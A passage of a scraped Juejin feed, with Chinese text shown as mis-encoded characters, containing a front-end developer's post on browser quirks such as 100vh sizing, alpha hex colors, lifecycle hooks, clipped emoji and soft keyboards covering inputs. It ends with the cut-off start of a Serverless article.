                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œä¸ºä¸€åå¼€å‘è€…ï¼Œbug å¾€å¾€æ˜¯æˆ‘ä»¬æœ€æ€•é‡è§çš„ä¸œè¥¿ï¼›è€Œæ¯”é‡åˆ° bug æ›´å¯æ€•çš„äº‹æƒ…ï¼Œæ˜¯å®šä½ä¸åˆ° bugã€‚ä½œä¸ºä¸€åå‰ç«¯å¼€å‘è€…ï¼Œä¸ä¸šåŠ¡é€»è¾‘ç›¸å…³çš„ bug è¿˜ç›¸å¯¹å¥½å®šä½ã€å¥½è§£å†³ä¸€äº›ï¼›è€Œä¸€äº›ä¸è¯­æ³•ç‰¹æ€§ã€å¹³å°ä¸è®¾å¤‡å·®å¼‚ç›¸å…³çš„ bug åˆ™æ›´ä»¤äººå¤´ç–¼ä¸€äº›ã€‚è¿™é‡Œè®°å½•ä¸‹æˆ‘åœ¨å·¥ä½œä¸­é‡åˆ°è¿‡çš„ç¨€å¥‡å¤æ€ªçš„å‰ç«¯é—®é¢˜ï¼Œä½œä¸ºç»™è‡ªå·±çš„è®°å½•å’Œæé†’ã€‚</p>
<h2 data-id="heading-0"><strong>ç”¨ vh å®šä¹‰å…¨å±æ˜¾ç¤ºçš„é—®é¢˜</strong></h2>
<p>å¾ˆå¤šé¡µé¢å› ä¸ºè®¾è®¡æ•ˆæœçš„éœ€è¦ï¼Œè¦æ±‚æ­£å¥½é“ºæ»¡ä¸€æ•´ä¸ªæ˜¾ç¤ºç•Œé¢ã€ä¹Ÿä¸å…è®¸ä¸Šä¸‹æ»‘åŠ¨ã€‚åšç±»ä¼¼çš„éœ€æ±‚æ—¶ï¼Œå¾€å¾€ç›´è§‰ä¼šä½¿ç”¨è¿™æ ·çš„ä»£ç è§£å†³é—®é¢˜ï¼š</p>
<pre><code class="hljs language-css" lang="css">{
 <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
}
</code></pre>
<p>è¿™æ ·çš„ä»£ç çœ‹ä¼¼å¾ˆä¼˜é›…ï¼Œä½†æ˜¯å¾€å¾€ä¼šæœ‰å…¼å®¹æ€§é—®é¢˜â€”â€”ä¸åŒæµè§ˆå™¨å®šä¹‰çš„è§†å£é«˜åº¦çš„å®šä¹‰ä¸ä¸€è‡´ï¼Œå¯¼è‡´ <code>100vh</code> å¹¶ä¸èƒ½çœŸæ­£è¦†ç›–å…¨è§†å£é«˜åº¦ï¼›è¿˜æœ‰ä¸å°‘æµè§ˆå™¨è§†å£é«˜åº¦æ•°å€¼ä¸å˜ä½†å®é™…è§†å£å¤§å°å¯å˜ï¼Œæ¯”å¦‚ç§»åŠ¨ç«¯ Chrome æµè§ˆå™¨çš„å¯¼èˆªæ æ—¶ä¸æ—¶éšè—ä½†ç½‘é¡µè·å–çš„è§†å£é«˜åº¦ä¸å˜ï¼Œè¿™éƒ½ä¼šå¯¼è‡´æœ€ç»ˆæ˜¾ç¤ºæ•ˆæœä¸ç¬¦åˆé¢„æœŸã€‚</p>
<p>å¦‚æœè¦å®ç°å…¨å±å¹•è¦†ç›–ä¸å¯æ»‘åŠ¨ï¼Œæ›´ä¸ºç¨³å¦¥å’Œä¿é™©çš„æ–¹æ³•æ˜¯ä½¿ç”¨ç»å¯¹å®šä½ï¼š</p>
<pre><code class="hljs language-css" lang="css">{
 <span class="hljs-attribute">position</span>: fixed;
 <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
 <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;
 <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
 <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-1"><strong>å¸¦ alpha é€šé“çš„ hex é¢œè‰²å€¼å¤±æ•ˆçš„é—®é¢˜</strong></h2>
<p>åœ¨è¾ƒæ–°çš„ web æ ‡å‡†ä¸­ï¼Œhex æ ¼å¼çš„é¢œè‰²ä»£ç ä¹Ÿå¯ä»¥è¡¨ç¤ºé€æ˜åº¦äº†ï¼Œåªéœ€è¦åœ¨å¸¸è§çš„å…­ä½ hex é¢œè‰²ä»£ç ååŠ ä¸¤ä½è¡¨ç¤ºé€æ˜åº¦çš„ hex å€¼ï¼Œä¾‹å¦‚ <code>#66ccff</code> è¡¨ç¤ºä¸€ç§è“è‰²ï¼Œè€Œ <code>#66ccff80</code> è¡¨ç¤ºé€æ˜åº¦ 50% çš„è¿™ç§è“è‰²ï¼ˆ80 æ˜¯ 16 è¿›åˆ¶çš„ 128ï¼Œæ˜¯ 256 çš„ä¸€åŠï¼Œå³ 50% é€æ˜åº¦ï¼‰ã€‚è™½ç„¶ç›´æ¥è¿™æ ·å†™ä»£ç çš„è¡Œä¸ºåœ¨å‰ç«¯å¼€å‘ä¸­ä¸æ™®éï¼Œä½†æ˜¯è®¾è®¡å¸ˆäº¤ä»˜çš„è§†è§‰ç¨¿ç»™å‡ºçš„å‚è€ƒå€¼æœ‰ä¸å°‘æ˜¯è¿™ç§æ ¼å¼ã€‚å¦‚æœç›´æ¥æŠŠè¿™æ ·çš„é¢œè‰²ä»£ç ç”¨äºç”Ÿäº§ä¸­ï¼Œå¯èƒ½ä¼šå‡ºç°ä»¥ä¸‹ä¸¤ç§é—®é¢˜ï¼š</p>
<p>â—¦å¦‚æœä½ ç¼–å†™çš„é¡¹ç›®å¼•å…¥äº† less æˆ–è€… sassï¼Œåœ¨è¿›è¡Œæ‰“åŒ…æ„å»ºçš„æ“ä½œæ—¶ï¼Œéƒ¨åˆ†é¢„å¤„ç†å™¨æ— æ³•æ­£ç¡®è¯†åˆ«å¸¦ alpha é€šé“çš„ hex é¢œè‰²å€¼ï¼Œå› æ­¤è¿™éƒ¨åˆ†ä»£ç æ— æ³•è¢«æ­£ç¡®è½¬è¯‘ï¼Œæœ€ç»ˆæ„å»ºå‡ºçš„ç”Ÿäº§ç¯å¢ƒä»£ç ä¸­è¿™éƒ¨åˆ†é¢œè‰²å¯èƒ½ä¸¢å¤±ã€‚</p>
<p>â—¦éƒ¨åˆ†ç§»åŠ¨ç«¯æµè§ˆå™¨å¹¶æœªé€‚é…å¸¦ alpha é€šé“çš„ hex é¢œè‰²å€¼ï¼Œå› æ­¤å³ä½¿æ˜¯ä½¿ç”¨åŸç”Ÿ css å®Œæˆçš„ä»£ç ï¼Œä¹Ÿæœ‰å¯èƒ½å‡ºç°åœ¨éƒ¨åˆ†æ‰‹æœºæˆ–éƒ¨åˆ†æµè§ˆå™¨é¢œè‰²ä¸æ­£å¸¸çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-2"><strong>ç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸æ‰§è¡Œçš„é—®é¢˜</strong></h2>
<p>åœ¨é¡µé¢åˆšæ‰“å¼€æˆ–å‡†å¤‡å…³é—­æ—¶ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦è¿›è¡Œä¸€äº›è¯¸å¦‚æ•°æ®åˆå§‹åŒ–ã€ç™»å…¥ç™»å‡ºã€æ•°æ®ä¸ŠæŠ¥ç­‰è¡Œä¸ºï¼Œè€Œè¿™äº›å¾€å¾€æ˜¯å€ŸåŠ© Vue æˆ– React çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°å®Œæˆçš„ã€‚ä¸è¿‡ï¼Œç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸æ‰§è¡Œä¹Ÿæ˜¯å¸¸è¢«å¿½ç•¥çš„ bugï¼Œè¯¦ç»†æ¥è¯´ï¼Œåˆå¯ä»¥åˆ†ä¸ºä¸¤ç±»åŸå› â€”â€”</p>
<h3 data-id="heading-3"><strong>ç»„ä»¶è¢« keep alive å¯¼è‡´æœªè¢«å¸è½½æˆ–é‡æ–°åŠ è½½</strong></h3>
<p>å¦‚æœæ˜¯ Vue ä¸­ä½¿ç”¨ <code>keep-alive</code> åŒ…è£¹çš„ç»„ä»¶ï¼Œæˆ–åœ¨ React ä¸­ä½¿ç”¨ç±»ä¼¼çš„ç¬¬ä¸‰æ–¹åº“ keep alive çš„ç»„ä»¶ï¼Œåªä¼šåœ¨ç¬¬ä¸€æ¬¡åŠ è½½æ—¶æ‰§è¡Œç”Ÿå‘½å‘¨æœŸåˆå§‹åŒ–å‡½æ•°ï¼Œä¸”ä¸ä¼šæ‰§è¡Œç”Ÿå‘½å‘¨æœŸå¸è½½å‡½æ•°ã€‚è¿™å¯¼è‡´çš„ä¸ç¬¦åˆé¢„æœŸçš„è¡Œä¸ºå¾ˆå¥½è§£å†³ï¼Œåªéœ€è¦ä½¿ç”¨ <code>onActivated</code> ä»£æ›¿ <code>onMounted</code> ï¼Œç”¨ <code>onDeactivated</code> ä»£æ›¿ <code>onUnmounted</code> å³å¯ã€‚</p>
<h3 data-id="heading-4"><strong>é¡µé¢è¢«ç›´æ¥å…³é—­å¯¼è‡´æ¡†æ¶ç”Ÿå‘½å‘¨æœŸå‡½æ•°æ— æ³•æ‰§è¡Œ</strong></h3>
<p>ä¸ç®¡æ˜¯ Vue è¿˜æ˜¯ Reactï¼Œç”Ÿå‘½å‘¨æœŸå‡½æ•°çš„æ­£ç¡®æ‰§è¡Œéƒ½ä¾èµ–äº Vue æˆ– React å®ä¾‹çš„å­˜åœ¨ã€‚è€Œå½“ç”¨æˆ·ç›´æ¥å…³é—­æµè§ˆå™¨é¡µé¢çš„æ—¶å€™ï¼ŒVue æˆ– React å®ä¾‹å·²ç»è¢«é”€æ¯äº†ï¼Œç”Ÿå‘½å‘¨æœŸå¸è½½å‡½æ•°å½“ç„¶å°±æ— æ³•æ‰§è¡Œäº†ã€‚å¤„ç†è¿™ç§æƒ…å†µä¹Ÿå¹¶ä¸éº»çƒ¦ï¼Œåªéœ€è¦åœ¨ç”Ÿå‘½å‘¨æœŸåˆå§‹åŒ–å‡½æ•°ä¸­æ·»åŠ å¯¹ window å¸è½½äº‹ä»¶çš„ç›‘å¬ï¼Œç„¶åæŠŠæƒ³è¦è¿›è¡Œçš„æ“ä½œæ”¾åˆ° window å¸è½½äº‹ä»¶å‡½æ•°é‡Œå°±å¥½äº†ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">onMonted</span>(<span class="hljs-function">() =&gt;</span> {  
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> {    
    <span class="hljs-comment">// éœ€è¦æ‰§è¡Œçš„ä»£ç  </span>
  });
});
</code></pre>
<h2 data-id="heading-5"><strong>æ–‡æœ¬ä¸­çš„ emoji ä¸Šä¸‹è¢«è£å‰ª</strong></h2>
<p>UGC å†…å®¹ä¸­ç»å¸¸å‡ºç°æ–‡æœ¬å’Œ emoji æ··æ’çš„åœºæ™¯ï¼Œè€Œæœ‰æ—¶å¯èƒ½é‡åˆ° emoji ä¸Šä¸‹è¾¹ç¼˜è¢«è£å‰ªçš„é—®é¢˜ã€‚è¿™å¾€å¾€æ˜¯ç”±äºå¼€å‘é¡µé¢æ—¶ä¸ºäº†é™å®šæ–‡æœ¬é«˜åº¦å’Œé—´è·æˆ–å…¶ä»–æ’ç‰ˆæ–¹é¢çš„è¦æ±‚ï¼Œå°† line-height å’Œ font-size è®¾ç½®ä¸ºåŒæ ·çš„å€¼ï¼Œä¸” overflow å±æ€§è¢«è®¾ç½®ä¸º hidden ã€‚å¦‚æœå‡ºç°ç±»ä¼¼æƒ…å†µï¼Œå»ºè®®å»é™¤ line-height çš„é™åˆ¶ï¼Œè€Œé€šè¿‡ margin ç­‰æ–¹å¼æ§åˆ¶è¡Œè·ï¼Œä»è€Œé¿å… emoji è¢«è£å‡ã€‚</p>
<h2 data-id="heading-6"><strong>è¾“å…¥æ¡†è¢«å¼¹èµ·çš„è½¯é”®ç›˜è¦†ç›–çš„é—®é¢˜</strong></h2>
<p>å¦‚æœç§»åŠ¨ç«¯é¡µé¢ä¸­æœ‰è¾“å…¥æ¡†ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½é¢ä¸´è¾“å…¥æ¡†è¢«å¼¹èµ·çš„è½¯é”®ç›˜è¦†ç›–çš„é—®é¢˜ã€‚ä¸€èˆ¬æ¥è®²ï¼Œå¯¹äºéœ€è¦å¼¹èµ·è½¯é”®ç›˜çš„åœºæ™¯ï¼Œè¾ƒæ–°çš„æµè§ˆå™¨æˆ–è€…ç§»åŠ¨ç«¯ app çš„ webview ä¼šè‡ªåŠ¨èšç„¦åˆ°è¾“å…¥æ¡†ä¸­å¹¶æ»šåŠ¨åˆ°ç›¸åº”ä½ç½®ï¼Œæ¥ä¿è¯è¾“å…¥æ¡†çš„æ­£å¸¸æ˜¾ç¤ºï¼›ä½†æ˜¯ï¼Œå¯¹äºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼Œå¼¹èµ·çš„è½¯é”®ç›˜ä¼šå°†è¾“å…¥æ¡†è¦†ç›–ï¼Œå½±å“ç”¨æˆ·è¾“å…¥ã€‚</p>
<h3 data-id="heading-7"><strong>æµè§ˆå™¨æœªèƒ½ä¸»åŠ¨èšç„¦åˆ°è¾“å…¥æ¡†</strong></h3>
<p>è½¯é”®ç›˜å¼¹èµ·æ—¶ï¼Œä¸€èˆ¬ä¼šä»åº•éƒ¨å°†é¡µé¢é¡¶èµ·ã€å‹ç¼©è§†å£ï¼›è§†å£é«˜åº¦å˜ä½äº†ï¼ŒåŸå…ˆå¤„äºæ˜¾ç¤ºåŒºåŸŸçš„è¾“å…¥æ¡†å¯èƒ½å°±è¢«æŒ¤åˆ°è¾“å…¥æ¡†å¤–äº†ã€‚å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨ç‰ˆæœ¬è¾ƒæ—©æˆ– app å†…ç½® webview è¾ƒä¸ºç‰¹æ®Šï¼Œæœ‰å¯èƒ½åœ¨è½¯é”®ç›˜å¼¹å‡ºåæµè§ˆå™¨æœªèƒ½ä¸»åŠ¨èšç„¦åˆ°è¾“å…¥æ¡†ä¸Šã€‚è¿™æ—¶ï¼Œå¼€å‘è€…å¿…é¡»ä¸»åŠ¨èšç„¦åˆ°è¾“å…¥æ¡†å¹¶ä½¿è¾“å…¥æ¡†æ»šåŠ¨åˆ°è§†å£å†…ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">inputEle</span> = document.querySelector(<span class="hljs-string">'#target-input'</span>)<span class="hljs-comment">;inputEle.focus();inputEle.scrollIntoView();</span>
</code></pre>
<h3 data-id="heading-8"><strong>è½¯é”®ç›˜é‡‡ç”¨è¦†ç›–åœ¨è§†å£ä¸Šå±‚è€Œéå‹ç¼©è§†å£çš„æ–¹å¼å¼¹å‡º</strong></h3>
<p>å¦‚æœæµè§ˆå™¨æˆ– webview ç‰ˆæœ¬è¾ƒä¸ºç‰¹æ®Šï¼Œä¸”è¾“å…¥æ¡†å¤„äºé¡µé¢é ä¸‹çš„ä½ç½®æˆ–è€…é’ˆå¯¹è§†å£ç»å¯¹å®šä½äºåº•éƒ¨ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šé¢ä¸´æ›´åŠ å¤æ‚çš„æƒ…å†µã€‚åˆšæ‰å·²ç»æåˆ°ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè½¯é”®ç›˜å¼¹èµ·çš„æ ‡å‡†åšæ³•æ˜¯ä»åº•éƒ¨å°†é¡µé¢é¡¶èµ·ã€å‹ç¼©è§†å£é«˜åº¦ï¼›ä½†æ˜¯æŸäº›æƒ…å†µä¸‹ï¼Œè½¯é”®ç›˜å¹¶ä¸æ”¹å˜è§†å£å°ºå¯¸ï¼Œè€Œæ˜¯ç›´æ¥ç›–åœ¨è§†å£ä¸Šæ–¹ã€‚è¿™å°±å¯¼è‡´é¡µé¢é€»è¾‘ä¸Šæ˜¯å±•ç¤ºå®Œæ•´çš„ã€è¾“å…¥æ¡†ä¹Ÿæ­£å¸¸æ˜¾ç¤ºåœ¨è§†å£ä¸­ï¼›ä½†è½¯é”®ç›˜é®æŒ¡äº†åŠä¸ªé¡µé¢ï¼Œä¹Ÿå°±çœŸæ­£æ„ä¹‰ä¸Šâ€œè¦†ç›–â€åœ¨è¾“å…¥æ¡†ä¸Šã€‚ç›®å‰ä¸»æµç§»åŠ¨ç«¯æµè§ˆå™¨è¾ƒæ–°çš„ç‰ˆæœ¬éƒ½ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯éƒ¨åˆ† app å†…ç½® webview ä¼šè®¾ç½®ä¸ºâ€œè½¯é”®ç›˜è¦†ç›–åœ¨ webview ä¸Šæ–¹â€ï¼›å› æ­¤è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¿…é¡»ç”±å®¢æˆ·ç«¯æ›´æ”¹ webview çš„è½¯é”®ç›˜è®¾ç½®ã€‚å¦‚æœæ˜¯å¾ˆæ—§çš„æµè§ˆå™¨ç‰ˆæœ¬æˆ–è€…æ— æ³•æ¨åŠ¨å®¢æˆ·ç«¯å¼€å‘è§£å†³é—®é¢˜ï¼Œé‚£å°±åªèƒ½æ”¾å¼ƒæ²»ç–—äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Gopher å¸¦ä½ å­¦ Serverless æ¶æ„ï¼šä»æœåŠ¡å™¨è¿ç»´åˆ°æŒ‰éœ€è®¡ç®—çš„èŒƒå¼è½¬å˜]]></title>    <link>https://juejin.cn/post/7580740782933622826</link>    <guid>https://juejin.cn/post/7580740782933622826</guid>    <pubDate>2025-12-08T06:20:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782933622826" data-draft-id="7580723992498552868" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Gopher å¸¦ä½ å­¦ Serverless æ¶æ„ï¼šä»æœåŠ¡å™¨è¿ç»´åˆ°æŒ‰éœ€è®¡ç®—çš„èŒƒå¼è½¬å˜"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-08T06:20:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ²¡å¤šå°‘é€»è¾‘"/> <meta itemprop="url" content="https://juejin.cn/user/2717648475395325"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Gopher å¸¦ä½ å­¦ Serverless æ¶æ„ï¼šä»æœåŠ¡å™¨è¿ç»´åˆ°æŒ‰éœ€è®¡ç®—çš„èŒƒå¼è½¬å˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648475395325/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ²¡å¤šå°‘é€»è¾‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:20:51.000Z" title="Mon Dec 08 2025 06:20:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶æœ‰æ—¶å€™æ˜¯å¦åŒå€¦äº†ç®¡ç†æœåŠ¡å™¨ã€é…ç½®ç¯å¢ƒã€å¤„ç†æ‰©å®¹ï¼Ÿåˆ«æ‹…å¿ƒï¼Œè¿™ç¯‡æŒ‡å—ä¸ºä½ ä»‹ç» <strong>Serverless æ¶æ„</strong>çš„æ 